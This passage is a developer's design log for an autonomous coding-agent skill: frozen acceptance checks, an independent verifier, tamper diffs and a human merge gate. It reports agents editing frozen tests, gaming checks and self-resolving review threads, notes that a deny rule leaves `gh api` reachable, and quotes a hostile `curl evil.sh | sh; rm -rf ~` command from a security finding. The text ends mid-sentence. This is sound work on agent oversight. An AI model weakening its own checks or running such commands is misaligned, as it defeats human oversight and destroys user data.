# agent-sessions — design

Captured 2026-07-23 from the originating brainstorm. This is the reasoning trail behind
the two-skill system, kept so the *why* survives.

## Origin

Burning down the [decafclaw](https://github.com/users/lmorchard/projects/6) project board
manually — pick issue → spec → plan → execute → PR → request Copilot review → address
comments → merge. Question: how to push more of that loop toward autonomy, escalating to
a human only for issues that actually need it.

## The one principle

**An agent is only as autonomous as its verifier is trustworthy.**

**Corollary (added from prior-art survey, see [prior-art.md](prior-art.md)):** trustworthy
means the *oracle itself* must be validated. "Criterion is machine-checkable" is necessary
but **not sufficient** — the check must also be *correct*, the verifier must be
**independent of the implementer**, and acceptance tests **frozen before implementation**
so the implementer can't weaken them (SWE-bench documents test-log misparsing; Anthropic
names self-verification bias). An untrustworthy green check is worse than no check.

(From Anthropic's ["Enabling Claude Code to work more autonomously"](https://www.anthropic.com/news/enabling-claude-code-to-work-more-autonomously)
and the long-running-agent research: if the agent can check its own work with a near-perfect
oracle, it can run; where the oracle is weak or missing, a human belongs.)

The manual loop already has **strong oracles in the middle** (`make check`, `make test`,
evals, Copilot review) and **weak oracles at the two ends**:
- front: *"is this issue well-specified enough to attempt unattended?"*
- back: *"is this PR safe to merge?"*

So: automate the strong-oracle middle; keep humans on the weak-oracle ends. The rest of
the design falls out of that.

## What to front-load (and what not to)

Ranked by leverage for autonomy:

1. **Verifiable acceptance criteria — the biggest lever.** A spec that says *what* to
   build defines the target; a spec that says *"done means X, and here's the check that
   proves it"* defines the **oracle**. That's what lets the loop grade itself. The
   criteria must resolve to something runnable (`test_x` passes, `make check` green, a new
   eval case), not prose a human eyeballs.
2. **Board triage / priorities** — powers *selection and throughput*, a different axis. It
   decides which issue the loop picks up and whether it's ready. Valuable, but it doesn't
   make any individual issue get built better.
3. **Pre-attached plans — weakest, mildly counterproductive.** A plan written at *filing*
   time is stale by *execution* time (the repo moved), and planning against live code is
   exactly what the model is good at doing fresh. **Generate the plan at execution time**
   (launch research subagents against current state, then compose) — don't freeze it at
   triage.

**Missing from the naive model:** the front-loaded metadata that specifically buys
autonomy is the **escalation signal**, not the plan. At triage, stamp: is this safe
unattended? (`auto-ok` vs `needs-review`), likely paths touched, rough size.

**Cost caveat:** front-loading only pays when the artifact is *reusable* (agent + Copilot
+ future-you read it) or *doubles as the verifier*. Small/mechanical issues should skip
the ceremony: one-line criterion, `auto-ok`, done. If speccing takes as long as doing,
you've moved the work earlier, not gained leverage.

## The reframe

**A good spec names its own verifier.** When you can write the acceptance criterion as a
check the loop can run, that issue is a candidate for the autonomous middle. When the only
honest test is "human decides," that's not a spec failure — it's the issue *telling you*
it belongs in `needs-review`. The criteria do double duty: power execution *and* sort
issues into autonomy tiers for free.

## The capability ladder (Claude Code, verified against docs 2026-07-23)

1. **Headless CLI** — `claude -p --allowedTools "..." --output-format json`.
   JSON output carries `total_cost_usd` + `session_id`; `--continue`/`--resume` chain
   sessions. [docs](https://code.claude.com/docs/en/headless)

   **Three corrections from move 3, all measured against `claude --help` 2.1.220 and live
   runs — this entry was wrong in ways that would have produced a broken driver:**

   - **`--bare` is unusable on this machine.** Under `--bare`, *"Anthropic auth is strictly
     `ANTHROPIC_API_KEY` or `apiKeyHelper` via `--settings` (OAuth and keychain are never
     read)."* No key is set here, so it fails to authenticate rather than running
     reproducibly. It also skips CLAUDE.md discovery, which `express.md` declares as an
     input — so a keyed GHA runner using `--bare` would lose the project context the skill
     needs. The reproducibility win is not free on either host.
   - **`--max-budget-usd <amount>`** (`-p` only) is a real CLI-enforced per-run cost
     ceiling. Reading `total_cost_usd` afterwards tells you what you spent; this stops you
     spending it. Use both.
   - **`--permission-mode dontAsk` denies unlisted *mutations*, not unlisted commands.**
     Measured with the filesystem as the oracle: `touch` outside the allowlist was denied,
     but `ls` was allowed with an allowlist of only `Bash(echo:*)`. Commands classified
     read-only are auto-allowed. The floor is real — it had never been tested here — but
     narrower than "denies anything outside allow-rules".

   Also established: **deny rules take precedence over allow rules and match multi-word
   command prefixes.** `--disallowedTools 'Bash(gh pr merge:*)'` blocks the merge even with
   `Bash(gh:*)` broadly allowed. That is what makes "nothing merges" a mechanism rather than
   an exhortation. Not airtight — prefix-matched, so `gh api` remains reachable — so a
   `PreToolUse` hook (item 4) is a precondition for any *unwatched* host.

   And the surprise that matters most operationally: **`--allowedTools`,
   `--disallowedTools` and `--add-dir` are all variadic** (`<tools...>`,
   `<directories...>`), so a trailing positional prompt is swallowed as another value and
   the run dies with *"Input must be provided either through stdin or as a prompt
   argument."* Pass the prompt on **stdin**. A flag list that works is not evidence the flag
   list is right when one of the flags is variadic.
2. **GitHub Actions** (`anthropics/claude-code-action@v1`) — the "runs without my laptop"
   unlock. Auto-detects `@claude` mention mode vs `prompt:` automation mode; the prompt
   form runs on *any* event including `schedule:` cron. Vertex via Workload Identity
   Federation (matters for decafclaw's multi-provider setup). Separate
   [GitHub Code Review](https://code.claude.com/docs/en/code-review) posts reviews on every
   PR with no trigger. [docs](https://code.claude.com/docs/en/github-actions)
3. **Agent SDK** (Python/TS) — full programmatic loop w/ hooks + subagents. **Overkill for
   decafclaw**: it's *already* an agent runtime with its own hooks/subagents/workflow
   engine. Building a second orchestrator to drive the first is redundant.
4. **Hooks** — `PreToolUse` can hard-block even under `bypassPermissions`; guardrails, not
   the primary loop.

Note on trusting research: the first-pass research subagent produced a wall of confident
detail; several specifics ("Claude Code Routines," a C-compiler blog's cost figures,
Pro/Max daily run limits, a specific CVE version) could **not** be verified and were
dropped. Distrust-and-verify is the same principle as the burndown loop, applied to the
research agent — its verifier (the human) has to be good, because unverified confident
output is exactly what weak oracles produce.

## Phased rollout (increasing autonomy, each reversible)

1. **Self-driving skill, local, human at the merge gate.** Package the manual loop as one
   command that runs spec → research → plan → execute → `make check && make test` → open
   PR with an `--allowedTools` allowlist, and *stops before merge*. Runs on-machine,
   watchable, interruptible. Lowest risk, highest immediate leverage.
2. **Scheduled GitHub Action opening draft PRs.** Same loop, no laptop required. Branch
   protection keeps merge human-gated. Second workflow triggered on Copilot review
   addresses comments.
3. **Conditional auto-merge.** Only `auto-ok` issues with all-green checks + no unresolved
   review threads. auth/data/deploy/`.github`/new-deps stay human-gated (aligns with the
   standing never-deploy-without-permission rule). Start conservative: auto-merge nothing
   until Phase 2 has earned trust.

**Safety:** avoid `--dangerously-skip-permissions` / `bypassPermissions`. Scoped
`--allowedTools` + `dontAsk` gets ~95% of the autonomy with a real floor under it.

## The two-skill system

### intake skill (grilling-derived, human-in-loop)

Lives at the weak-oracle front end. Job: turn a wishlist stub into a spec whose criteria
are runnable checks, plus an escalation tier — and emit a filable issue.

Built on Matt Pocock's [grilling skill](https://github.com/mattpocock/skills/blob/main/skills/productivity/grilling/SKILL.md),
which is a near-perfect engine. Its mechanics map directly:

- **"Probe the environment for factual matters rather than asking"** = the
  research-subagents-then-plan instinct. The skill dispatches Explore/research agents to
  answer *factual* questions about the codebase (does this pattern exist? current shape?
  is there a test harness?) and spends the human's attention only on *decisions*.
- **"Provide your recommended answer alongside each question"** = kills the overhead risk.
  Inverts authoring effort: instead of "what are the acceptance criteria?" (blank page),
  the skill — having researched — *proposes* criteria as runnable checks and the human
  ratifies/corrects. Fast triage, not a dreaded form.
- **"One question at a time, walk the decision tree resolving dependencies"** = the spine:
  definition → scope boundaries → each criterion → (derived) tier.
- **"Don't act until shared understanding is confirmed"** = the human-in-loop gate.

What intake *adds* on top of grilling (the thin, opinionated layer):

1. **A fixed target schema** instead of open-ended "shared understanding" — driving toward
   *definition + verifiable criteria + escalation tier*; done when those slots are filled.
2. **Verifiability as the per-branch success test** — refuses to close a criterion while
   it's still a wish; its recommended answer is *always* a runnable check, and "how would
   you actually know?" is the standing follow-up.
3. **An output artifact** — emits the filable issue body + labels, tier *inferred* from
   whether every criterion resolved to a check (all checks → `auto-ok`; any "human decides"
   → `needs-review`).

Scope guardrail: intake is for **heavier issues only**. Small/mechanical ones skip it.

### execution skill (self-driving, autonomous middle)

Phase 1 above. Consumes a well-specified issue; runs the loop; stops at the merge gate.

### shared contract

The seam between intake's *output* and execution's *input*: the acceptance-criteria format
+ escalation labels. Design once, both read from it. (In the spirit of decafclaw's
"don't hand-maintain parallel field lists that rot in lockstep.")

## Finding (2026-07-23, later): dev-session already IS the producer/consumer core

Studied the existing `~/.claude/skills/dev-session` skill (SKILL.md + phases + references).
It already implements most of the two-skill system sketched above — not "similar to," but
*is* it. The sequel is therefore an **upgrade + orchestration layer**, not a reimplementation.

Already covered by dev-session:

| Sketched as "new" | Where it already lives |
|---|---|
| Producer/consumer split | `file` (produces spec-embedded issue) → `express` (autonomously consumes); `<!-- dev-session:spec -->` marker = the shared contract/seam |
| Research-then-plan-live | `brainstorm` documentarian substep → `research.md`; plan generated at `plan`/`express` time, never frozen at filing |
| Grilling-style interview | `brainstorm` step 3: propose best judgment + trade-offs, confirm/adjust, no open-ended Qs, multiple-choice preferred |
| Crude autonomy tier | `express` Phase 0 complexity check (pushes back on L/XL/ambiguous); feel-driven carve-out refuses autonomous execution of subjective visual work |
| Board transitions | Ready → In Progress → In Review via `references/github-projects.md` |
| Spec-readiness gate | Readiness checklist in `spec-template.md` |
| Scope proportional to complexity | `brainstorm` step 4 |

The genuine gaps — the ~20% that is actually new and high-leverage:

1. **Verifiable acceptance criteria as first-class (the core gap).** spec-template's
   "Desired end state" is *prose* (user-visible behavior, API surface); the Readiness
   checklist gates on placeholders / consistency / scope / ambiguity but **nothing requires
   each criterion to name a runnable check.** Upgrading spec-template + the readiness
   checklist to demand a runnable oracle per criterion (`test_x` passes, `make check`
   green, an eval case) is the highest-value change — and it's small. This is
   "a good spec names its own verifier" made concrete.
2. **A durable, verifiability-derived tier label** stamped at `file` time (not decided
   ad-hoc at `express` Phase 0), so a board/cron loop can *route* on it. The tier falls
   out of "did every criterion resolve to a check?" (all → `auto-ok`; any human-eyeball →
   `needs-review`).
3. **The merge gate.** `express` stops at PR-with-Copilot-addressed; merge is human.
   Conditional auto-merge by tier (all-green + no unresolved threads + `auto-ok`) is new.
4. **The board-level driver.** Nothing today *picks the next Ready issue and runs `express`
   unattended*, then advances. That orchestration (headless `claude -p` / scheduled GHA)
   is the actual "burndown loop" and sits *above* a per-issue skill.

Reframed build: (1)+(2) are **enhancements to dev-session** (spec-template, brainstorm,
readiness checklist, `file`). (3)+(4) live *above* a per-issue skill — the orchestration
bookends. So "standalone skill vs dev-session phase" resolves mostly toward *extend
dev-session*; the separate artifact is the driver + merge gate.

## Build status (2026-07-24)

Decided: **single `agent-session` skill, multi-mode dispatcher** (dev-session lineage), not
separate skills. Rationale: sidesteps the unverified cross-skill file-sharing mechanism
entirely (all refs in-dir), and the dispatcher's lazy-load means modes never co-reside, so
adding modes doesn't confound the LLM mid-phase — the only confounding risk is at the entry
boundary, mitigated by explicit mode arguments + an ask-don't-guess dispatcher. Heavy modes
fan out to subagents; the board-driver stays *above* the skill as orchestration.

Built (front-of-funnel), in `skills/agent-session/`:
- `SKILL.md` — dispatcher, context-management notes, conventions.
- `references/acceptance-criteria.md` — **the novel core**: every criterion names a runnable
  check; verifier-independence + freeze-before-implementation; concrete-test → property →
  human-judgment escalation ladder; **oracle-must-already-exist** rule; tier derivation
  (auto-ok/needs-review) + risk-gated-path override.
- `references/criteria-grammar.md` — EARS (five patterns, verified against Mavin) +
  Given-When-Then syntax reference.
- `references/spec-template.md` — criteria replace prose "desired end state"; readiness
  checklist gates on *verifiability*.
- `references/documentarian-prompt.md` — neutral negation rules for the research subagent
  (shared by intake + triage); includes the oracle-existence question.
- `phases/intake.md` — new + existing-issue (augment) modes; reduce each requirement to
  criterion+check; verify each check's oracle exists *now*; derive tier; file/update issue.
- `phases/triage.md` — batch backlog-gardening; subagents fan out to assess + draft proposed
  criteria, human ratifies in a fast pass, augment in place.

Built (back half, move 1), in `skills/agent-session/`:
- `references/frozen-checks.md` — **the back-half novel core**: the `checks.md` manifest
  (criteria copied verbatim, stable `C1…Cn` ids), the freeze commit, the read-only rule, the
  independent verifier subagent, the `git diff <freeze-sha>` tamper check, and the amendment
  path (stop → human-confirm → log → **downgrade the run to `needs-review`**).
- `phases/plan.md` — gates on verifiability, re-verifies oracles still exist, **Phase 0 is the
  freeze** (written before the rest of the plan), bidirectional criteria coverage in self-review.
- `phases/execute.md` — per-criterion checks by name as the gate; frozen files read-only to
  implementers; independent verifier + tamper diff, not self-report; evidence produced for
  human-judgment criteria.
- `phases/pr.md` + `references/pr-body-template.md` — the **tiered merge gate**, derived by
  reading rows (all checks pass per the verifier + human-graded judgment criteria + clean
  tamper diff + green project gates + no unresolved threads + `auto-ok` + no risk-gated paths).
  Emits a machine-readable `<!-- agent-session:gate -->` block. **Never merges.**
- `phases/express.md` — Phase 0 checks *preconditions* (marker / readiness / size) instead of
  judging complexity by feel; a missing marker routes to `intake`. Tier decides only *where the
  run surfaces to a human*, not whether it runs.
- `references/session-setup.md`, `references/plan-template.md`, `references/github-projects.md`.

Validated:
- **intake — micro-tested AND dogfooded.** Micro-test (Sonnet, control vs treatment, 5
  reps/arm) on the criteria-gate wording: control 0/5 checkable, treatment 5/5 → wording is
  load-bearing; a 4:1 tier-split surfaced the oracle-must-exist gap, fix closed it 5/5.
  Then dogfooded end-to-end on a real issue (starnet #129) via the augment path — filed
  criteria + `auto-ok` tier back to the issue; the run surfaced + fixed two skill gaps
  (missing documentarian ref; missing oracle-verification step).
- **triage — built, NOT yet dogfooded.**
- **frozen-checks read-only rule + amendment path — micro-tested, LOAD-BEARING.** Fixture: a
  frozen check whose assertion contradicts its own criterion, implementation already correct.
  Control 4/5 diagnosed the contradiction and then **edited the frozen check inline**; 1/5
  asked. Treatment 0/5 edited, 5/5 stopped with the prescribed check-vs-criterion statement.
  No over-triggering. Caveat: a clean no-guidance control is unreachable on this machine (the
  global CLAUDE.md's "no weakening test assertions" leaks into every `claude -p` run), so the
  effect is a **lower bound**.
- **"run each check by name / aggregate green is not the gate" — micro-tested, NOT load-bearing.**
  20 reps across two fixtures (including one where the implementation *looks* done — an
  idiomatic dict dedup keeping the last occurrence where the criterion wants the first, with
  `make check` green): both arms caught it 10/10. **The `checks.md` manifest naming the exact
  command is the mechanism; the exhortation adds nothing** — so it was trimmed to one sentence.
  Two earlier fixtures were discarded as non-discriminating; recording that because "control
  passed 5/5" is only evidence about wording when the fixture can actually fail.
- **execute mid-run mechanics + the pr gate — NOT yet exercised by a real run** (see below).

Dogfood of move 1 (starnet #129) — **stopped at Phase 0, correctly.** AC1 ("SHALL produce zero
`tick-cap` runs", checked by a census invocation) **already passes on current code**:
`{"trace": 20}` at both grade A and S. `census.js` has no placement flag, so the issue's
"S @ switch-1" evidence isn't reachable through AC1's command, and `tick-cap`
(`scripts/bot/loop.js:130`) never fires because the bot dies to trace first. AC1 is vacuous —
it cannot distinguish done from untouched, so the `auto-ok` tier isn't supported. `plan`/
`frozen-checks` caught it exactly where designed ("a check that passes at freeze — surface it").

The miss was upstream, and is now fixed: `acceptance-criteria.md` required the oracle to
**exist** but never to **discriminate**, and intake's step 4 accepted a grep. New rule: *run*
the check, confirm it fails, record the failure; a past evidence table is not a substitute.
Tell: a "SHALL produce zero X" criterion whose command produces zero X today. Also clarified
that oracle-must-exist turns on *whose judgment* (a labeled corpus defers a human decision) and
not on *whether a test file exists yet* (an ordinary unit test the criterion fully specifies is
written at Phase 0) — otherwise the rule would send every criterion to `needs-review`.

### Second intake dogfood — decafclaw #638 (filed 2026-07-24)

Switched the move-1 dogfood vehicle off starnet #129 (its remaining path needs a census
placement flag — an oracle-building prerequisite, i.e. an intake conversation, not a test of the
execution modes) to **decafclaw #638** (`forkpty` DeprecationWarnings dirty the suite). decafclaw
is the repo the system was designed to burn down and has a real pytest harness. Filed via the
augment path: marker + criteria + tier, original text preserved verbatim (concatenation).

Three findings, all from *running* things rather than reading them:

1. **The intuitive check was vacuous again.** `pytest -W error::DeprecationWarning` **passes**
   today — the warning is emitted in the forked child, so promoting it to an error catches
   nothing. Had that been stamped as the check it would have gone green immediately and proven
   nothing. The discriminating check asserts on the `warnings summary` section instead. That is
   **two for two** (#129's AC1, #638's obvious check) — the vacuous check looks like the *default*
   outcome when nobody runs the check before freezing it, not a rare slip.
2. **The issue's own facts were wrong in a way that mattered.** It says `test_terminals.py`
   spawns twice; it's actually two different files, one spawn each — which changes the mechanism
   (two marks in two files, not two in one). Verified counts: `make test` → 3234 passed, 2
   skipped, 2 warnings, 69s.
3. **Criteria vs. guards** (see below). #638 honestly reduces to **one criterion + three guards**,
   and there was nowhere to put guards.

Also noted: the chosen mechanism (per-test marks) is what *keeps* the issue `auto-ok` — the
`pyproject.toml` alternative touches build/CI config, which the risk-gated list pulls toward
`needs-review`. Mechanism choice and tier are coupled, which wasn't obvious before.

### Criteria vs. regression guards (added 2026-07-24)

The discriminate rule opened a gap: "the full suite stays green" and "output is byte-identical"
can never fail at freeze, so as criteria they're vacuous — yet they obviously want checking. Two
dogfoods hit it from opposite directions (the pure-refactor exemplar presenting a golden test as
a CRITERION; #638 landing as 1 criterion + 3 guards), so it was a hole, not a wording nit.

A **criterion** says what the work must *newly* make true (must fail now); a **guard** says what
it must not break (must pass now). Guards don't affect the tier. Wired through both engines and
every consumer — manifest section, spec slot, readiness item, per-phase verification, the
verifier's remit, and a `guards:` field in the gate block. They earn their place by catching one
specific cheat: **making a criterion go green by deleting the coverage that contradicted it**,
which leaves every criterion passing and the suite green, and only a guard notices.

### Move 1 dogfood COMPLETE — decafclaw #638 → PR #659 (2026-07-24)

Ran `plan` → `execute` → `pr` end to end on decafclaw #638, stopping at the gate.
[PR #659](https://github.com/lmorchard/decafclaw/pull/659): all criteria and guards pass, tamper
diff clean, **verdict `human-merge-required`** — see thread hole below. The whole back half now
has real-run evidence.

**The verifier caught its own author.** The scoped tamper constraint I wrote mid-run said "every
added line MUST be a `@pytest.mark.filterwarnings` decorator", but the plan also required an
explanatory comment per mark. My own mechanical check used a looser regex allowing comments —
i.e. I silently applied the rule's intent rather than its letter and passed myself. The
independent verifier (dispatched as `Explore`, which has **no Edit/Write**, so it structurally
cannot touch the oracle it grades) read the constraint literally and reported the mismatch.

Les's call on the resolution was right and corrected an over-strict instinct: comments are inert
to pytest and cannot weaken an assertion, so this is a *mis-stated rule*, not an oracle change.
The generalizable lesson is stronger than the strictness I was defending — **a tamper rule that
fires on inert changes produces false positives, and false positives train the operator to wave
the mechanism through.** State tamper rules as invariants over *what a check asserts*, never as
whitelists of allowed line forms. This also produced the **amendment vs. clarification** split
(amendment changes what a check asserts → downgrade; clarification fixes wording that never
matched its own intent → logged, human-adjudicated, no downgrade).

**The same defect class appeared twice in one run.** Guard G1 pinned `3234 passed, 2 skipped`;
the rebase pulled in upstream tests and it read `3265`, tripping the letter while the property
("nothing lost, newly skipped, or newly failing") held. Brittle absolutes encoding relative
invariants — worth watching for as a category, not two one-offs.

**Three gate holes found, all fixed in `pr.md`:**
1. **Disputed threads must not be self-resolved.** Copilot filed 4 comments; 3 were factually
   wrong (its claim that the warning message contains a newline defeating the regex — refuted by
   `repr()`: single line, `re.match` succeeds; it was misled by a hard line-wrap inside a code
   fence in the issue body my `spec.md` copied) and 1 was already answered in the artifact.
   Skipping them is right, but *resolving* them would have cleared the gate's "no unresolved
   threads" condition on the agent's own say-so — self-satisfiable, therefore meaningless. Rule:
   resolve only what you fixed. This is why #659 ends at `human-merge-required`, which is the
   gate working, not failing.
2. **Rebase invalidates the freeze sha** (rewritten commit → baseline outside branch history).
3. **Squash destroys the freeze commit**, so the tamper baseline is unreachable afterwards.

**Also found:** `session-setup.md` hardcodes `.worktrees/` — decafclaw already uses
`.claude/worktrees/`, so it must detect the project's existing convention. And the freeze
procedure said "commit, record the sha", which is impossible in one commit (a commit can't
contain its own hash) — needs a follow-up commit.

### `triage` dogfood — 8 decafclaw issues (2026-07-24)

Fanned out 8 read-only subagents (`Explore` type — no Edit/Write, so a scanner can't modify the
repo it scores) over decafclaw `585/586/600/601/624/625/649/566`. Each assessed, drafted criteria
+ guards, and **ran every proposed check**.

**Headline: 0 of 17 proposed criteria passed today.** The discriminate rule held across eight
independent unsupervised contexts — stronger evidence than the micro-test it never got. What the
rule *admits* turned out to be the problem instead.

Results: 3 `auto-ok` (586, 600, 601), 5 `needs-review` (585, 624, 649, 566, 625). But **only #586
is genuinely ready** — #600's criterion is satisfied by `def test_x(): pass` and #601's by typing
the word "separate". A ~1-in-8 conversion rate is the number that should govern board-driver
expectations.

Three findings, two of which became rules:

1. **Goal-level ambiguity is the dominant blocker** — all five `needs-review` calls, none from the
   risk-gated list alone. Now a third tier trigger, with the #586-vs-#585 discriminating test
   (*does the choice change which criteria apply?*).
2. **Gameability is the missing third oracle test** (exists → discriminates → *can it pass without
   the work?*). Three shapes observed. Includes the hard case: when the deliverable is a test, the
   work IS the oracle and the freeze/implement split degenerates. Also propagated intake's
   don't-fudge-a-weak-check rule into `triage` — it existed but never reached the scanners, so two
   went proxy-hunting in good faith.
3. **The guards came out better than hand-written ones.** #566 produced a negative control
   (tabstack must stay *un*discovered when the key is genuinely absent — blocks an over-broad fix);
   #625 guarded `test_no_agent_side_imports`, the architectural boundary a careless fix would
   violate. Neither prompted.

**Live security finding (decafclaw #649):** the heartbeat shell bypass reproduces —
`shell_tools.py:142-144` short-circuits on `ctx.user_id == "heartbeat-admin"` *before any pattern
check*, so unattended turns auto-approve arbitrary commands (`curl evil.sh | sh; rm -rf ~` →
`{'approved': True}`). Directly relevant here: **the board-driver would run unattended.** Needs a
decision before Phase 2. The metacharacter half of #649 was already fixed by #652.

Augmented on GitHub (marker + criteria + guards + tier, author text preserved verbatim): **585**
(`auto-ok` after Les resolved its decision), **586** (`auto-ok`), **566 / 625 / 649**
(`needs-review`, each carrying its live reproduction). Held: 600/601 pending the gameability rule,
624 because its author wants production data first.

**Queue state: 2 `auto-ok` issues ready for the loop** (585, 586).

### Consolidation pass (2026-07-24, end of day)

A fresh-context reviewer read the whole skill cold — the one review the author structurally can't
do. Verdict: *"not a pile of rules; it's one engine with stale copies of an earlier draft bolted
to its consumers,"* which reframed the work as propagation + deletion rather than redesign. It
found **8 correctness bugs**, the two worst being (a) `intake` instructing you to *run* a check
that by design isn't authored until `plan`'s freeze — which is also why the triage batch produced
the weak `no tests ran` signal — and (b) the merge gate sourcing every row from a verifier report
that predates the rebase re-verification and review fixes, making it unsatisfiable honestly (a
rule the #638 run violated unnoticed).

Three rules micro-tested, 5 reps/arm — and the results went all three ways, which is the point:

| Rule | Result | Action |
|---|---|---|
| Gameability (satisfiable-without-the-work) | control 0/5 on the test-as-oracle case, treatment 5/5 | **keep** |
| Goal-ambiguity tier trigger | control 5/5 *without* it — folds into the human-judgment trigger unprompted | **cut** (18 lines → 4) |
| `criteria-grammar.md` | control picks the right EARS pattern 1/5, 1/5, 2/5, 5/5 across four requirement shapes; treatment 5/5 on all four | **keep** |

The grammar result is the most instructive. The cold reviewer's most confident deletion was
"it teaches EARS to a model that already knows EARS" — plausible, and wrong. The model knows *of*
EARS but defaults nearly everything to `WHEN`, losing Ubiquitous (always-true invariants) and
`WHILE` (state-driven), and missing `IF/THEN` for the error path 3 times in 5. Those patterns map
to different check shapes, so flattening them costs the criterion→assertion mapping the grammar
exists to produce. **Confident architectural review is not a substitute for measurement**, even —
especially — when it agrees with your own instinct to cut.

Net line count came out roughly flat (1674 → 1658): the correctness fixes added about what the
deletions removed. The gain was coherence and 8 fixed bugs, not size.

### `express` dogfood — decafclaw #586 → PR #665 (2026-07-24, move 2)

**`express` ran end to end for the first time**, cold through the marker the way a driver would
invoke it: [PR #665](https://github.com/lmorchard/decafclaw/pull/665), verdict
**`eligible-for-auto-merge`** — the first time that verdict has been reached. Three of the four
things the handoff flagged came out clean: the size check didn't push back on an XS issue; the
chain genuinely chained (session dir, freeze sha, `checks.md` handed off across plan → execute →
pr with no state carried in the driver's head); and `auto-ok` produced no spurious stops.

Also the first dogfood where **the issue's facts held up** — #129's AC1 was vacuous and #638's
mechanism description was wrong, but #586's claim about `iter_conversation_archives` checked out and
both greps still returned `1` at the lines the issue named. The triage-side discriminate rule works.

**The headline finding: `eligible-for-auto-merge` was reached with two of eight gate rows satisfied
by substitute evidence rather than by the mechanism the gate cites.** Both are now fixed.

1. **The gate cited a command that does not exist.** `gh pr view <n> --json reviewThreads` — not a
   valid field (gh 2.96.0); it errors and prints the field list, which reads a lot like "no
   threads." One of eight rows had no runnable command. Replaced with a verified GraphQL query
   (tested in its line-wrapped form, since a hard wrap inside a code fence is what misled Copilot
   on #638).
2. **The tamper mechanism is vacuous when criteria are commands rather than test files** — the
   shape a board-driver will meet most often. `Check files` empty ⇒ the read-only rule protects
   nothing, `git diff <freeze-sha> -- <check files>` has nothing to compare, and the freeze's
   "author the tests" step is a no-op. Worse, the `tamper:` vocabulary was `clean | amended |
   DIRTY`, so the honest result rendered as `clean` and a machine reader could not distinguish
   *diffed-and-clean* from *nothing-to-diff*. **A null was being reported as a positive.** New
   `frozen-checks.md` section defines three substitutes (manifest integrity as an invariant,
   byte-equality against the issue, no collateral edits) and a `clean-by-substitute` verdict value.
3. **`checks.md` was outside its own tamper baseline** — and for command-based criteria the manifest
   *is* the entire oracle. The non-obvious part: it can't simply be added, because the freeze
   procedure guarantees the file differs (the sha lands in a follow-up commit) and `pr` step 5
   mandates writing the tamper verdict into it. So it had to become an invariant over *what*
   changed — no CRITERION/CHECK/guard line may differ; appends are inert — which is the lesson
   `frozen-checks.md` already taught about tamper rules and had not applied to itself.
4. **`execute.md`'s trivial-edit skip could drop the verifier `express` calls non-skippable.** "A
   single trivial edit → make it and go to `pr`" bypasses step 4. #586 *is* a single trivial edit,
   and so is most of what an unattended loop picks up. Now scoped to skipping the phase machinery
   only.
5. **The gate block was published before its rows were knowable.** Step 6 filled it at PR-open, but
   `threads` and the post-review verifier report only exist at step 14 — so a machine-readable
   `verdict: eligible-for-auto-merge` sat in the body throughout the review cycle, actionable by a
   driver polling PRs. Now opens `verdict: pending`.
6. **Express's readiness precondition could not be passed by this skill's own output.** Checklist
   item 6 wants a "What we're NOT doing" section; `triage`'s write-back emits marker + criteria +
   guards + tier only. So #586 — specced and stamped `auto-ok` *by this skill* — failed its own
   readiness gate on a literal reading, whose remedy is "route to `intake`," i.e. back to the mode
   that just produced it. Fixed with an **augmented-existing-issue variant** of the checklist
   (items 1–5 and 7 unchanged; item 6 becomes "scope bounded somewhere in the body"; missing
   template sections are not failures, a missing criterion still is), wired into `express` and
   `plan`.

**The verifier earned its place again.** Dispatched as `Explore` (no Edit/Write), it established
that post-squash the freeze commit is a dangling local object — resolvable locally, *not* an
ancestor of HEAD, `fatal: couldn't find remote ref` against origin — so nobody else can reproduce
the tamper diff and the pre-squash record does all the work, exactly as `pr.md` predicts. Now
stated in `pr.md` where the record is written.

**Self-review caught what neither the criteria nor Copilot did:** guard G1's `12 passed` is mostly
irrelevant tests — 8 of 12 are `test_startup_scan_workflows_*`, a different method (#581) the change
never touches. Only 4 exercise `startup_scan` and exactly 1 covers the missing-directory path at
issue. Verified empirically that the one does (the `config` fixture's `data_home` is a bare
`tmp_path` and `workspace_path` isn't created eagerly). Left un-narrowed — editing a frozen guard
mid-run is what the contract forbids — and recorded in the PR instead. **Generalizable: a guard's
pass count is not a coverage measure, and `-k` selections silently include neighbours.**

Two findings left unfixed by agreement: `plan.md` step 10's "every phase advances at least one
`Cn`" flags Phase 0, which by the template's own design advances none (wording nit). And board
transitions silently no-op on decafclaw (no `## GitHub Project` in its `CLAUDE.md`) — correct per
the rules, but an operator can't distinguish "no board" from "transition failed," and decafclaw does
have the board (project 6) the driver premise assumes.

One deviation owned rather than hidden: `execute.md` says to invoke `subagent-driven-development`
unconditionally when available; a 4-line deletion got done inline instead. Left alone deliberately —
an `unless trivial` clause is exactly the nuance-on-a-winning-recipe that degrades things, and it
cuts against finding 4's direction. Measure before touching.

**Still unexercised:** the `needs-review` branch, the amendment path, and multi-phase `execute` with
real implementer subagents. #586 was two greps on a 4-line diff, so it tested the *chain*, not the
*work* — a vehicle for the latter needs its own `intake` pass on something larger.

### `needs-review` branch exercised — decafclaw #649 → PR #686 (2026-07-24, move 2b)

Ran `intake` then `express` on the heartbeat shell bypass, after Les decided the remediation
(constrain unattended turns to the same allowlist as interactive users). [PR
#686](https://github.com/lmorchard/decafclaw/pull/686), verdict **`human-merge-required`** — six of
eight gate rows true, two false *by design*: tier is `needs-review` and the diff is an authorization
path. Every criterion, all seven guards, and `make check` pass. **The `needs-review` branch behaved
as specified**: it ran the work to completion rather than refusing, and surfaced exactly once, at the
risk-gated diff, before the PR opened. Also the first run with a real check *file*, so the tamper
diff was a genuine mechanical clean rather than `clean-by-substitute`.

**The verifier caught its author for the second time — and again on a claim I'd have signed off.** I
told it the last change was a comment-only edit; it reported that task unanswerable because there was
no separate commit to diff. Correct: **the review fix was uncommitted, so the pushed PR didn't
contain it**, and I had run every check against a working tree that didn't match the remote. The
lesson generalizes past this instance: *"I ran the checks" is a claim about a tree, and the tree you
ran them on is not necessarily the one you pushed.*

**`pr.md` step 4 caught a live near-miss.** `git diff origin/main..HEAD` showed ~500 lines of
deletions I never made (`test_skills.py` −182, `evals/skill-authoring.yaml` −67). Stale base, not
corruption — main had advanced. Squashing against it would have put those deletions in the PR
silently. That hazard was written from reasoning in move 1; it is now confirmed live.

**Main moved three times mid-run**, each forcing a rebase + freeze-sha re-anchor + full re-verify,
and one of them (`5ecf3fc`) touched `skill_tools.py`, the function under change. The re-anchoring
machinery held across all three. Operational finding for the board-driver: **on an active repo a long
run pays a re-verification tax per upstream landing**, and the freeze sha is invalidated every time.

**The relative guard invariant earned itself twice** — G6 130→140 and the suite 3425→3436 as upstream
